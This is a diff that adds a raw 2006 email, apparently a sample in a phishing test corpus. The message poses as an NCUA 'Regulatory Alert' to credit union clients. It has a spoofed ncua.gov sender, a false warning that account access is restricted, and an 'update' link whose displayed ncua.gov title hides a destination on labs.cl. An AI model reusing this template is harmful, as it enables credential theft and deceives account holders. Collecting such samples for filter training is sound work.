@@ -1,0 +1,90 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id EDF1E2A898
+ for <user@example.com>; Thu, 26 Jan 2006 17:36:34 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id E7812621CA0; Thu, 26 Jan 2006 17:36:34 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id CD6CC621C95
+ for <user@example.com>; Thu, 26 Jan 2006 17:36:34 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id RAA15222
+ for user@example.com; Thu, 26 Jan 2006 17:36:34 -0500
+Received: from server1.23rhodes.net (mail.23rhodes.net [199.103.168.178])
+ by mail.example.com with ESMTP id RAA15214
+ for <user@example.com>; Thu, 26 Jan 2006 17:36:34 -0500
+Message-Id: <200601262236.RAA15214@mail.example.com>
+Received: from [198.237.72.230] (helo=User)
+ by server1.23rhodes.net with esmtpa (Exim 4.52)
+ id 1F2Gdw-0005RK-FV; Thu, 26 Jan 2006 18:35:10 -0500
+Reply-To: <no-reply@ncua.gov>
+From: "N C U A" <acc-validity@ncua.gov>
+Subject: Letter to Credit Unions Regulatory Alert 
+Date: Fri, 27 Jan 2006 00:33:59 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 283
+
+<html>
+<head>
+<title></title>
+<style type=text/css>
+<!--
+.panel{-moz-border-radius: .3em .3em .3em .3em; border: 1px dotted silver; background-color: #F7F6F4;
+}
+-->
+</style>
+</head>
+<body>
+
+<TABLE align="center" width="50%" border=0>
+<tr>
+<td align="left"><img src="http://www.geocities.com/slutsd/BLUELAB.gif" border=0></td>
+</tr>
+<tr>
+<td> </td>
+</tr>
+<TR>
+<TD><b>LEGAL NOTICE</b></TD>
+</TR>
+<TR><TD></TD><br></TR>
+<TR><TD></TD><br></TR>
+<TR>
+<TD class="panel"><b>Message sent to you follows:</b></TD>
+</TR>
+<TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD></TR>
+<TR>
+	<TD><font color="Navy" size="3"><b>Dear NCUA client,</b></font><br>
+	<br>
+	      <font face="Arial" size="2px">As part of our security measures, we regularly screen activity in Federal Credit Unions (FCU) network.For your protection, we have limited access to your account until additional security measures can be completed. We apologize for any inconvenience this may cause. Please log in to your FCU account to restore your access as soon as possible. 
+
+
+<br>
+	<br>
+	We apologies for any inconvinience this may caused you and we strongly advise you to update your information 
+you have on file with us. Please <a  href="http://www.labs.cl/continue.html" title="https://www.ncua.gov/upd.php">update</a> in order to avoid any possible futuring billing problems with your account.<br>
+	<br>
+        <br>
+        <br>
+	<br>
+        <br>
+	<b>Best regards</b>,<br>
+	- <i>NCUA Team</i>.
+        </TD>
+        </tr>
+</TABLE>
